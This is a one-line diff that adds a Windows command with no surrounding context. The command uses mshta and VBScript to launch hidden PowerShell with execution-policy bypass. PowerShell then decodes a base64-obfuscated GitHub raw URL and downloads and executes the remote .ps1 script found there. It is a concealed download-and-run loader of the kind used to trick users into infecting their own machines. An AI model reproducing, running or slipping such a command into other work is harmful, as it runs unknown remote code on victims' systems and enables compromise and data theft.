@@ -1,0 +1,1 @@
+mshta.exe vbscript:CreateObject("WScript.Shell").Run("powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""iex (irm ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlcmFmaXBrYS9pZGtha2t3YS9yZWZzL2hlYWRzL21haW4vcGlkb3IucHMx'))))""",0,False):Window.Close
